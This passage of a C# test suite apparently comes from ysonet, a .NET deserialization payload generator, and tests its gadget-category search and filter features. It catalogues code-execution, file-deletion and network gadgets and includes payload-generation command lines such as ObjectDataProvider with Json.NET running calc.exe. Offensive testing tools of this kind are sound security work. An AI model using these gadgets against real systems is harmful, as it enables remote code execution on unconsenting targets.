            // XamlImageInfo variant 1 = local-file + nested-deserialization; variant 2 =
            // command + code-execution. No single unit is local-file AND code-execution,
            // so the correlated query must NOT match, but each axis alone must.
            var both = new GadgetCategoryQuery();
            both.Add(CategoryAxis.Input, PayloadInput.LocalFile);
            both.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
            AssertTrue(!GadgetCategoryCommand.MatchingGadgetNames(both).Contains("XamlImageInfo"),
                "no single unit is both local-file and code-execution");

            var inputOnly = new GadgetCategoryQuery();
            inputOnly.Add(CategoryAxis.Input, PayloadInput.LocalFile);
            AssertTrue(GadgetCategoryCommand.MatchingGadgetNames(inputOnly).Contains("XamlImageInfo"),
                "local-file alone matches XamlImageInfo variant 1");
        }

        private static void MultipleValuesUnionAndAxesIntersection()
        {
            var ce = new GadgetCategoryQuery(); ce.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
            var net = new GadgetCategoryQuery(); net.Add(CategoryAxis.Kind, PayloadKind.Network);
            var either = new GadgetCategoryQuery();
            either.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
            either.Add(CategoryAxis.Kind, PayloadKind.Network);

            int nCe = CliListing.Gadgets(ce).Count;
            int nNet = CliListing.Gadgets(net).Count;
            int nEither = CliListing.Gadgets(either).Count;
            AssertTrue(nCe > 0 && nNet > 0, "both single-value queries match something");
            AssertTrue(nEither >= nCe && nEither >= nNet, "OR within an axis is a union");

            var ceJson = new GadgetCategoryQuery();
            ceJson.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
            ceJson.Add(CategoryAxis.Formatter, "Json.NET");
            int nCeJson = CliListing.Gadgets(ceJson).Count;
            AssertTrue(nCeJson <= nCe, "adding a second axis (AND) can only narrow");
        }

        private static void ExistingFacetAudit()
        {
            // Lock representative units so a future edit that silently changes a
            // gadget's broad category fails loudly.
            // TypeConfuseDelegate's three variants only swap the serialized root container
            // (SortedSet / SortedDictionary / TreeSet). The capability is identical for all
            // three: it runs a command with framework built-in types, so none declares a
            // facet override.
            // The version row is part of the lock: all three variants share the 4.5-era
            // ComparisonComparer floor and the 4.8.1 ceiling the FULL suite fired them on.
            for (int v = 1; v <= 3; v++)
                AssertCap("TypeConfuseDelegate", v,
                    new[] { PayloadKind.CodeExecution },
                    new[] { PayloadInput.Command },
                    new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
                    RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));

            // TypeConfuseDelegateFileOperations shares the primitive but not the payload
            // kind: it is file-system, not code-execution, and its input is a TARGET path
            // rather than a command. Variant 1 (write) is the only one that also names a
            // file on the operator machine, so it is the only one with a facet override -
            // and that override repeats the same kind, requirements and versions, because
            // an override replaces the whole set.
            AssertCap(FileOpsGadget, 1,
                new[] { PayloadKind.FileSystem },
                new[] { PayloadInput.TargetPath, PayloadInput.LocalFile },
                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
                RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));

            for (int v = 2; v <= 5; v++)
                AssertCap(FileOpsGadget, v,
                    new[] { PayloadKind.FileSystem },
                    new[] { PayloadInput.TargetPath },
                    new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
                    RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));

            // The gadget FileLogTraceListener was migrated off the local-file input type
            // for the same distinction: its -c is a directory the target creates.
            AssertCap("FileLogTraceListener", null,
                new[] { PayloadKind.FileSystem },
                new[] { PayloadInput.TargetPath },
                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));

            // TempFileCollection is the third file-system gadget and the only one that
            // DELETES. It declares its inputs explicitly rather than deriving them, because
            // File.Delete takes a UNC path as readily as a local one, so unc-path is a real
            // accepted form and not just a target path that happens to start with two
            // backslashes. No variants, so the single unit carries the whole claim. Its floor
            // is the CLR v4 default (nothing in the chain is 4.5-only) and its ceiling is the
            // build the FULL suite deleted a file on.
            AssertCap(TempFilesGadget, null,
                new[] { PayloadKind.FileSystem },
                new[] { PayloadInput.TargetPath, PayloadInput.UncPath },
                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));

            AssertCap("WindowsClaimsIdentity", 1,
                new[] { PayloadKind.NestedDeserialization },
                new[] { PayloadInput.Command },
                new[] { GadgetRequirement.ExtraAssembly, GadgetRequirement.NetFramework },
                RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));

            AssertCap("ObjRef", null,
                new[] { PayloadKind.Network },
                new[] { PayloadInput.RemoteUrl },
                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));

            AssertCap("DataSetOldBehaviourFromFile", 1,
                new[] { PayloadKind.CodeExecution },
                new[] { PayloadInput.SourceCodeFile },
                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.Wpf, GadgetRequirement.NetFramework },
                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));

            // DataTable is a same-graph root carrier, NOT a nested-BinaryFormatter sink
            // like DataSet: its complete payload runs code via the inner gadget. Variant 1
            // (default, TextFormattingRunProperties) is code-execution with an
            // extra-assembly + WPF requirement and no BuiltIn; this locks the distinction
            // from DataSet, which is easy to regress toward. Variant 2 (TypeConfuseDelegate)
            // is code-execution and framework built-in (no WPF, no extra assembly). The
            // two variants also differ on versions: only variant 2 carries the 4.5-era
            // TypeConfuseDelegate inner.
            AssertCap("DataTable", 1,
                new[] { PayloadKind.CodeExecution },
                new[] { PayloadInput.Command },
                new[] { GadgetRequirement.ExtraAssembly, GadgetRequirement.Wpf, GadgetRequirement.NetFramework },
                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));

            AssertCap("DataTable", 2,
                new[] { PayloadKind.CodeExecution },
                new[] { PayloadInput.Command },
                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
                RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));

            AssertCap("XamlImageInfo", 1,
                new[] { PayloadKind.NestedDeserialization },
                new[] { PayloadInput.LocalFile, PayloadInput.UncPath },
                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.Wpf, GadgetRequirement.NetFramework },
                NoVersionEvidence);

            AssertCap("XamlImageInfo", 2,
                new[] { PayloadKind.CodeExecution, PayloadKind.NestedDeserialization },
                new[] { PayloadInput.Command },
                new[] { GadgetRequirement.ExtraAssembly, GadgetRequirement.Wpf, GadgetRequirement.NetFramework },
                NoVersionEvidence);

            // XamlImageInfo is the audited gadget the execution matrix never fires (its
            // effect is a nested parse, not a sink the tests own), so it has no version
            // evidence and must keep saying so.
            // The narrowest version claim in the catalog: this payload exists to switch
            // off the 4.8+ ActivitySurrogateSelector type check.
            AssertCap("ActivitySurrogateDisableTypeCheck", 1,
                new[] { PayloadKind.Other },
                new[] { PayloadInput.None },
                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.Wpf, GadgetRequirement.NetFramework },
                new[] { RuntimeVersion.NetFx48, RuntimeVersion.NetFx481 });
        }

        private static void CategoryQueryParsesAllAxes()
        {
            GadgetCategoryQuery q; string err;
            bool ok = GadgetCategoryQuery.TryParse(
                new[] { "KIND=Code-Execution", "formatter=json.net", "input=UNC-PATH", "Requirement=extra-assembly",
                        "VERSION=4.8.1" },
                out q, out err);
            AssertTrue(ok, "valid axes parse: " + err);
            AssertTrue(q.Kinds.Contains(PayloadKind.CodeExecution), "kind parsed case-insensitively");
            AssertTrue(q.Formatters.Contains("Json.NET"), "formatter canonicalized to Json.NET");
            AssertTrue(q.Inputs.Contains(PayloadInput.UncPath), "input parsed");
            AssertTrue(q.Requirements.Contains(GadgetRequirement.ExtraAssembly), "requirement parsed");
            AssertTrue(q.Versions.Contains(RuntimeVersion.NetFx481), "a bare version number canonicalizes");
        }

        private static void CategoryQueryRejectsMalformedValues()
        {
            GadgetCategoryQuery q; string err;
            AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "" }, out q, out err), "empty rejected");
            AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "kindcodeexec" }, out q, out err), "missing = rejected");
            AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "foo=bar" }, out q, out err), "unknown axis rejected");
            AssertTrue(err.Contains("kind") && err.Contains("formatter") && err.Contains("version"),
                "axis error lists valid axes");
            AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "kind=banana" }, out q, out err), "unknown kind rejected");
            AssertTrue(err.Contains(PayloadKind.CodeExecution), "value error lists valid values");
            AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "formatter=NoSuchFmt" }, out q, out err), "unknown formatter rejected");
            AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "version=4.9" }, out q, out err),
                "a version that never shipped is rejected");
            AssertTrue(err.Contains(RuntimeVersion.NetFx481), "version error lists valid versions");
        }

        private static void CategoryQueryCombinesSelections()
        {
            GadgetCategoryQuery q; string err;
            AssertTrue(GadgetCategoryQuery.TryParse(new[] { "kind=network", "kind=network" }, out q, out err), "parses");
            AssertEqual(1, q.Kinds.Count, "duplicate values collapse to one");
        }

        private static void CategoryOptionParsesRepeated()
        {
            ysonet.Program.rawCategoryValues.Clear();
            try
            {
                ysonet.Program.options.Parse(new[] { "--category=kind=network", "--category=formatter=Json.NET" });
                AssertEqual(2, ysonet.Program.rawCategoryValues.Count, "two --category values collected");
                AssertTrue(ysonet.Program.rawCategoryValues.Contains("kind=network"), "first value captured");
            }
            finally
            {
                ysonet.Program.rawCategoryValues.Clear();
            }
        }

        private static void FilteredGadgetListIsMachineReadable()
        {
            GadgetCategoryQuery q; string err;
            GadgetCategoryQuery.TryParse(new[] { "kind=code-execution" }, out q, out err);
            var names = CliListing.Gadgets(q);
            AssertTrue(names.Count > 0, "filtered list is non-empty");
            var sorted = new List<string>(names);
            sorted.Sort(StringComparer.OrdinalIgnoreCase);
            AssertTrue(names.Count == new HashSet<string>(names).Count, "names are unique");
            for (int i = 0; i < names.Count; i++)
                AssertEqual(sorted[i], names[i], "names are sorted");
            AssertTrue(names.Contains("TypeConfuseDelegate"), "a code-execution gadget is listed");
            AssertTrue(!names.Contains("WindowsPrincipal"), "a pure nested-deserialization gadget is excluded");
            AssertTrue(!names.Contains("Generic"), "Generic is excluded");
        }

        private static void UnfilteredGadgetListIsUnchanged()
        {
            var baseline = CliListing.Gadgets();
            var viaNull = CliListing.Gadgets((GadgetCategoryQuery)null);
            var viaEmpty = CliListing.Gadgets(new GadgetCategoryQuery());
            AssertEqual(baseline.Count, viaNull.Count, "null query returns the full list");
            AssertEqual(baseline.Count, viaEmpty.Count, "empty query returns the full list");
            for (int i = 0; i < baseline.Count; i++)
            {
                AssertEqual(baseline[i], viaNull[i], "null query order matches");
                AssertEqual(baseline[i], viaEmpty[i], "empty query order matches");
            }
        }

        private static void CategoryCommandShowsMatchingUnitsAndNoMatches()
        {
            // Matching search: ObjRef is the network gadget; its detailed unit shows.
            var netQ = new GadgetCategoryQuery();
            netQ.Add(CategoryAxis.Kind, PayloadKind.Network);
            string outText, errText;
            int code = CaptureConsole(() => GadgetCategoryCommand.RunHumanSearch(netQ), out outText, out errText);
            AssertEqual(0, code, "a matching search exits 0");
            AssertTrue(outText.Contains("(*) ObjRef"), "matching gadget printed to stdout");
            AssertTrue(outText.Contains("Kind: Network"), "matching unit is detailed");

            // Non-RCE search: the converted FileLogTraceListener gadget is discoverable.
            var fsQ = new GadgetCategoryQuery();
            fsQ.Add(CategoryAxis.Kind, PayloadKind.FileSystem);
            code = CaptureConsole(() => GadgetCategoryCommand.RunHumanSearch(fsQ), out outText, out errText);
            AssertEqual(0, code, "the file-system search exits 0");
            AssertTrue(outText.Contains("(*) FileLogTraceListener"),
                "the non-RCE FileLogTraceListener gadget is printed");

            // No-match search: a valid but currently unused vocabulary value.
            var disclosureQ = new GadgetCategoryQuery();
            disclosureQ.Add(CategoryAxis.Kind, PayloadKind.InformationDisclosure);
            code = CaptureConsole(() => GadgetCategoryCommand.RunHumanSearch(disclosureQ), out outText, out errText);
            AssertEqual(1, code, "a no-match search exits 1");
            AssertTrue(string.IsNullOrEmpty(outText.Trim()), "no-match leaves stdout empty");
            AssertTrue(errText.Contains("No gadgets match"), "no-match explanation on stderr");
        }

        private static void CategoryCliDispatch()
        {
            int exit; string so, se;
            if (!TryRunYsonet("--category=kind=code-execution", out exit, out so, out se))
            {
                Console.Error.WriteLine("  [skip] CategoryCliDispatch: ysonet.exe not found beside the test exe");
                return;
            }
            AssertEqual(0, exit, "standalone search exits 0");
            AssertTrue(so.Contains("(*) TypeConfuseDelegate"), "standalone search prints matches to stdout");

            TryRunYsonet("--category=kind=file-system", out exit, out so, out se);
            AssertEqual(0, exit, "non-RCE search exits 0");
            AssertTrue(so.Contains("(*) FileLogTraceListener"),
                "non-RCE search prints FileLogTraceListener");

            TryRunYsonet("--category=kind=information-disclosure", out exit, out so, out se);
            AssertEqual(1, exit, "no-match search exits 1");

            TryRunYsonet("--category=bad=x", out exit, out so, out se);
            AssertEqual(1, exit, "malformed axis exits 1");
            AssertTrue(se.Contains("kind") && se.Contains("formatter"), "malformed axis error lists valid axes");

            TryRunYsonet("-g ObjectDataProvider -f Json.NET -c calc.exe --category=kind=network", out exit, out so, out se);
            AssertEqual(1, exit, "category with payload generation is rejected");
            AssertTrue(se.Contains("discovery option"), "rejection explains the conflict");

            TryRunYsonet("--list gadgets --category=input=unc-path", out exit, out so, out se);
            AssertEqual(0, exit, "list gadgets with a category exits 0");
            AssertTrue(!so.Contains("(*)") && !so.Contains("Categories"), "filtered list prints names only");
            AssertTrue(so.Contains("XamlImageInfo"), "filtered list includes a unc-path gadget");

            TryRunYsonet("--list plugins --category=kind=network", out exit, out so, out se);
            AssertEqual(1, exit, "only the gadgets listing accepts a category query");
        }

        private static void HelpShowsCategories()
        {
            int exit; string so, se;
            if (!TryRunYsonet("--help", out exit, out so, out se))
            {
                Console.Error.WriteLine("  [skip] HelpShowsCategories: ysonet.exe not found beside the test exe");
                return;
            }
            AssertTrue(so.Contains("Categories"), "normal help shows compact categories");

            TryRunYsonet("-g XamlImageInfo --fullhelp", out exit, out so, out se);
            AssertEqual(0, exit, "gadget-specific full help exits 0");
            AssertTrue(so.Contains("Categories [variant 1]:"), "specific help shows per-variant categories");
            AssertTrue(so.Contains("Kind:") && so.Contains("Accepted input:"), "specific help details all axes");
        }

        // ---- interactive category filter tests --------------------------------

        private static void CategoryFilterModelBehaviors()
        {
            var model = CategoryFilterModel.Load(new GadgetCategoryQuery());
            AssertEqual(CliListing.Gadgets().Count, model.MatchingNames().Count, "no filter shows all gadgets");
            AssertTrue(model.CountForValue(CategoryAxis.Kind, PayloadKind.CodeExecution) > 0, "code-execution has gadgets");

            var ce = new GadgetCategoryQuery(); ce.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
            var both = ce.Clone(); both.Add(CategoryAxis.Kind, PayloadKind.Network);
            AssertTrue(model.MatchingNames(both).Count >= model.MatchingNames(ce).Count, "union within an axis is >= single");

            var ceJson = ce.Clone(); ceJson.Add(CategoryAxis.Formatter, "Json.NET");
            AssertTrue(model.MatchingNames(ceJson).Count <= model.MatchingNames(ce).Count, "a second axis (AND) narrows");
        }

        private static void CategoryFilterDriverSelectsAndPersists()
        {
            var applied = new GadgetCategoryQuery();
            var model = CategoryFilterModel.Load(applied);
            var kindValues = model.ValuesForAxis(CategoryAxis.Kind);
            AssertTrue(kindValues.Count > 0, "kind axis has values");
            string first = kindValues[0];

            var keys = new ScriptedKeyReader();
            keys.Down();     // focus Show(0) -> Payload kind(1)
            keys.Enter();    // open the kind checklist (highlight on the first value)
            keys.Type(" ");  // Space toggles the first value
            keys.Enter();    // apply -> back to the main screen
            keys.Home();     // focus -> Show
            keys.Enter();    // Show -> return the result

            var filter = new CategoryFilter(keys, model);
            CategoryFilterResult result = WithSwallowedError(() => filter.Run());
            AssertTrue(result != null, "Show returns a result");
            var exp = new GadgetCategoryQuery(); exp.Add(CategoryAxis.Kind, first);
            AssertEqual(model.MatchingNames(exp).Count, result.Names.Count, "result matches the model for that value");
            AssertTrue(applied.Kinds.Contains(first), "the selection persisted into the session query");
        }

        private static void CategoryFilterEscDiscardsAxisDraft()
        {
            var applied = new GadgetCategoryQuery();
            var model = CategoryFilterModel.Load(applied);
            var keys = new ScriptedKeyReader();
            keys.Down().Enter();  // open the kind checklist
            keys.Type(" ");       // toggle the first value into the draft
            keys.Escape();        // discard the draft -> main
            keys.Escape();        // Esc at main -> return null
            var filter = new CategoryFilter(keys, model);
            var result = WithSwallowedError(() => filter.Run());
            AssertTrue(result == null, "Esc at the main screen returns null");
            AssertEqual(0, applied.Kinds.Count, "Esc discarded the axis draft");
        }

        private static void CategoryFilterClearAll()
        {
            var applied = new GadgetCategoryQuery();
            applied.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
            var model = CategoryFilterModel.Load(applied);
            var keys = new ScriptedKeyReader();
            // Rows: Show(0), one row per axis, then [ Clear all ]. Walk down by the
            // axis count so a new axis does not silently retarget this test.
            for (int i = 0; i < CategoryFilterModel.Axes.Length + 1; i++) keys.Down();
            keys.Enter();                            // clear all
            keys.Escape();                           // exit
            var filter = new CategoryFilter(keys, model);
            WithSwallowedError(() => filter.Run());
            AssertEqual(0, applied.Kinds.Count, "Clear all emptied the selections");
        }

        private static void CategoryFilterDisablesImpossibleValues()
        {
            var applied = new GadgetCategoryQuery();
            applied.Add(CategoryAxis.Kind, PayloadKind.Network);
            var model = CategoryFilterModel.Load(applied);
            AssertEqual(1, model.CountForValue(CategoryAxis.Requirement, GadgetRequirement.ExtraAssembly),
                "InfiniteProgressPage is the network gadget that needs an extra assembly");
            AssertEqual(0, model.CountForValue(CategoryAxis.Requirement, GadgetRequirement.ModernDotNet),
                "no network gadget needs modern .NET");

            var reqValues = model.ValuesForAxis(CategoryAxis.Requirement);
            int idx = reqValues.IndexOf(GadgetRequirement.ModernDotNet);
            AssertTrue(idx >= 0, "modern-dotnet is a catalog value");

            var keys = new ScriptedKeyReader();
            keys.Down().Down().Down().Down();  // focus -> Requirements (row 4)
            keys.Enter();                      // open the checklist
            for (int i = 0; i < idx; i++) keys.Down();
            keys.Type(" ");                    // Space on a disabled value: no-op
            keys.Enter();                      // apply (draft is still empty)
            keys.Escape();                     // exit
            var filter = new CategoryFilter(keys, model);
            WithSwallowedError(() => filter.Run());
            AssertEqual(0, applied.Requirements.Count, "an impossible value cannot be selected");
        }

        private static void CategoryFilterDoesNotStack()
        {
            // Real-console redraw path (VirtualTerminal, cursor control on): from the
            // gadget build flow open the category filter (the "[ Filter by category... ]"
            // row at the bottom of the module list), open an axis checklist, discard
            // back, then leave. The screens must clear/redraw in place on re-entry; the
            // filter menu must never stack a second copy on one screen (the reported bug).
            var frames = DriveFrames(k => k.Enter()    // top -> Build a gadget payload (columns)
                .End()                                 // jump to the "[ Filter by category... ]" row
                .Enter()                               // open the category filter
                .Down().Enter()                        // open the Payload kind checklist
                .Escape()                              // discard -> back to the main filter
                .Escape()                              // Esc at the filter -> back to the columns
                .Escape()                              // leave the columns -> top menu
                .Escape());                            // quit
            foreach (Frame f in frames)
                AssertTrue(RowsContaining(f, "Filter gadgets (optional)") <= 1,
                    "the category filter must not stack a second menu on one screen");
            // Sanity: both the filter screen and an axis checklist actually rendered.
            AssertTrue(AnyFrame(frames, "Filter gadgets (optional)"), "the filter screen rendered");
            AssertTrue(AnyFrame(frames, "Space: toggle"), "an axis checklist rendered");
        }

        private static int RowsContaining(Frame f, string needle)
        {
            int n = 0;
            for (int y = 0; y < f.Height; y++)
                if (f.Row(y).Contains(needle)) n++;
            return n;
        }

        private static void ModuleViewShowsCategorySummary()
        {
            ModuleView v = ModuleView.FromGadget("XamlImageInfo");
            AssertTrue(v != null, "gadget view loads");
            AssertTrue(v.PreviewText().Contains("Categories"), "the gadget preview shows a category summary");
        }

        private static void GadgetFilterNarrowsAndResets()
        {
            var session = new WizardSession();
            var names = CliListing.Gadgets();
            var editor = new ModuleEditor(new ScriptedKeyReader(), new MemoryStream(), true, names, session);

            AssertTrue(!editor.IsGadgetFilterActive, "no filter initially");
            AssertEqual(names.Count, editor.FilteredModuleNames().Count, "no filter shows all gadgets");
            AssertTrue(editor.ModuleListEntries().Contains(ModuleEditor.FilterActionLabel), "the filter action is offered");
            AssertTrue(!editor.ModuleListEntries().Contains(ModuleEditor.ResetActionLabel), "no reset action while inactive");

            // Apply a code-execution filter via the session query the editor reads.
            session.CategorySelections.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
            AssertTrue(editor.IsGadgetFilterActive, "filter active after a selection");
            var filtered = editor.FilteredModuleNames();
            AssertTrue(filtered.Count > 0 && filtered.Count < names.Count, "the filter narrows the list");
            AssertTrue(filtered.Contains("ObjectDataProvider"), "a code-execution gadget is kept");
            AssertTrue(!filtered.Contains("WindowsPrincipal"), "a nested-only gadget is dropped");
            AssertTrue(editor.ModuleListEntries().Contains(ModuleEditor.ResetActionLabel), "the reset action is offered while active");
            AssertTrue(editor.PickerTitle().Contains("filtered"), "the picker title notes the active filter");

            // Reset clears it.
            session.CategorySelections.Clear();
            AssertTrue(!editor.IsGadgetFilterActive, "filter cleared after reset");
            AssertEqual(names.Count, editor.FilteredModuleNames().Count, "reset restores all gadgets");
        }

        private static void CategoryFilterInBuildGeneratesSamePayload()
        {
            var kindValues = CategoryFilterModel.Load(new GadgetCategoryQuery()).ValuesForAxis(CategoryAxis.Kind);
            int ceIdx = kindValues.IndexOf(PayloadKind.CodeExecution);
            AssertTrue(ceIdx >= 0, "code-execution is a catalog value");

            var keys = new ScriptedKeyReader();
            keys.Enter();                                 // top -> Build a gadget payload
            keys.Type("Filter by category").Enter();      // module picker: open the filter action
            keys.Down().Enter();                          // filter: open the Payload kind checklist
            for (int i = 0; i < ceIdx; i++) keys.Down();
            keys.Type(" ");                               // select code-execution
            keys.Enter();                                 // apply
            keys.Home().Enter();                          // Show -> back to the narrowed module picker
            keys.Type("ObjectDataProvider").Enter();      // pick it
            keys.Type("formatter").Enter();               // open the formatter setting
            keys.Digit(2);                                // Json.NET
            keys.Type("Generate").Enter();                // generate
            keys.Escape();                                // leave the form
            keys.Escape();                                // leave the module picker -> top menu
            keys.Escape();                                // quit

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);
            byte[] expected = GenerateOdpJson("calc.exe");
            AssertTrue(got.Length > 0, "in-build filter flow produced a payload");
            AssertTrue(BytesEqual(got, expected), "filtered payload equals the core payload");
            AssertTrue(stderr.Contains("Filter gadgets (optional)"), "the filter screen was reached from the build flow");
        }

        private static void PluginFlowHasNoCategoryScreen()
        {
            var keys = new ScriptedKeyReader();
            keys.Digit(2);   // top -> Build a plugin payload (index 1)
            keys.Escape();   // module list -> top
            keys.Escape();   // quit
            string stderr;
            DriveWizard(keys, out stderr);
            AssertTrue(stderr.Contains("Pick a plugin"), "plugin flow opens its picker directly");
            AssertTrue(!stderr.Contains("Filter by category"), "plugin flow offers no category filter action");
            AssertTrue(!stderr.Contains("Filter gadgets (optional)"), "plugin flow shows no category filter screen");
        }

        private static void ExistingGadgetFlowReachesPickerDirectly()
        {
            var keys = new ScriptedKeyReader();
            keys.Enter();    // top -> Build a gadget payload (index 0)
            keys.Escape();   // module list -> top
            keys.Escape();   // quit
            string stderr;
            DriveWizard(keys, out stderr);
            AssertTrue(stderr.Contains("Pick a gadget"), "the build path opens the gadget picker directly");
            AssertTrue(stderr.Contains("filter by category"), "the gadget picker hints at the category filter");
            AssertTrue(!stderr.Contains("Filter gadgets (optional)"), "the filter screen is not shown until requested");
        }

        // ---- category test helpers --------------------------------------------

        private static GadgetCapability FindCap(string gadget, int? variant)
        {
            foreach (var c in GadgetFacetReader.ExpandAll())
                if (string.Equals(c.GadgetName, gadget, StringComparison.OrdinalIgnoreCase)
                    && c.VariantNumber == variant)
                    return c;
            return null;
        }

        // The declared versions of one capability unit, with a readable failure when
        // the unit does not exist (a wrong variant number otherwise surfaces as a bare
        // NullReferenceException in whichever test looked it up).
        private static List<string> CapVersions(string gadget, int? variant)
        {
            GadgetCapability c = FindCap(gadget, variant);
            AssertTrue(c != null, gadget + (variant.HasValue ? (" variant " + variant) : " (no variant)")
                + " expands to a capability unit");
            return c == null ? new List<string>() : c.Versions;
        }

        private static void AssertCap(string gadget, int? variant, string[] kinds, string[] inputs,
            string[] requirements, string[] versions)
        {
            var c = FindCap(gadget, variant);
            AssertTrue(c != null, gadget + (variant.HasValue ? (" variant " + variant) : "") + " expands");
            AssertSetEqual(c.Kinds, kinds, gadget + " kinds");
            AssertSetEqual(c.Inputs, inputs, gadget + " inputs");
            AssertSetEqual(c.Requirements, requirements, gadget + " requirements");
            AssertSetEqual(c.Versions, versions, gadget + " runtime versions");
        }

        // Most audited gadgets have no recorded runtime version, so name that once
        // instead of repeating the literal in every row.
        private static readonly string[] NoVersionEvidence = { RuntimeVersion.Unspecified };

        private static void AssertSetEqual(List<string> actual, string[] expected, string msg)
        {
            var a = new HashSet<string>(actual ?? new List<string>(), StringComparer.OrdinalIgnoreCase);
            var e = new HashSet<string>(expected, StringComparer.OrdinalIgnoreCase);
            AssertTrue(a.SetEquals(e), msg + " (expected [" + string.Join(",", expected)
                + "], got [" + string.Join(",", (actual ?? new List<string>()).ToArray()) + "])");
        }

        private static void AssertThrows(Action a, string msg)
        {
            bool threw = false;
            try { a(); } catch { threw = true; }
            AssertTrue(threw, msg);
        }

        private static int CaptureConsole(Func<int> action, out string outText, out string errText)
        {
            TextWriter prevOut = Console.Out, prevErr = Console.Error;
            var so = new StringWriter();
            var se = new StringWriter();
            Console.SetOut(so);
            Console.SetError(se);
            try { return action(); }
            finally
            {
                Console.SetOut(prevOut);
                Console.SetError(prevErr);
                outText = so.ToString();
                errText = se.ToString();
            }
        }

        // Run ysonet.exe (built beside the test exe) with the given argument string.
        // Returns false if the exe is not found, so the caller can skip cleanly.
        private static bool TryRunYsonet(string args, out int exit, out string outText, out string errText)
        {
            exit = 0; outText = ""; errText = "";
            string exe = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ysonet.exe");
            if (!File.Exists(exe))
                return false;
            var psi = new System.Diagnostics.ProcessStartInfo(exe, args);
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            using (var proc = System.Diagnostics.Process.Start(psi))
            {
                outText = proc.StandardOutput.ReadToEnd();
                errText = proc.StandardError.ReadToEnd();
                if (!proc.WaitForExit(20000)) { try { proc.Kill(); } catch { } }
                try { exit = proc.ExitCode; } catch { exit = -999; }
            }
            return true;
        }
    }

    // A scripted key source so menu and picker logic can be driven without a
    // terminal. Throws if it runs dry, so a wrong script fails fast instead of
    // hanging.
    internal class ScriptedKeyReader : IKeyReader
    {
        private readonly Queue<ConsoleKeyInfo> _keys = new Queue<ConsoleKeyInfo>();

        public ScriptedKeyReader Type(string text)
        {
            foreach (char c in text)
                _keys.Enqueue(new ConsoleKeyInfo(c, ConsoleKey.A, false, false, false));
            return this;
        }

        // Type a line and press Enter (for a free-text prompt).
        public ScriptedKeyReader TypeLine(string text)
        {
            Type(text);
            return Enter();
        }

        public ScriptedKeyReader Enter()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\r', ConsoleKey.Enter, false, false, false));
            return this;
        }

        public ScriptedKeyReader Down()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.DownArrow, false, false, false));
            return this;
        }

        public ScriptedKeyReader Up()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.UpArrow, false, false, false));
            return this;
        }

        public ScriptedKeyReader Home()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.Home, false, false, false));
            return this;
        }

        public ScriptedKeyReader End()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.End, false, false, false));
            return this;
        }

        public ScriptedKeyReader Escape()
        {
            _keys.Enqueue(new ConsoleKeyInfo((char)27, ConsoleKey.Escape, false, false, false));
            return this;
        }

        public ScriptedKeyReader Digit(int n)
        {
            char c = (char)('0' + n);
            ConsoleKey k = (ConsoleKey)((int)ConsoleKey.D0 + n);
            _keys.Enqueue(new ConsoleKeyInfo(c, k, false, false, false));
            return this;
        }

        public ConsoleKeyInfo ReadKey()
        {
            if (_keys.Count == 0)
                throw new InvalidOperationException("scripted key source is empty");
            return _keys.Dequeue();
        }
    }
}
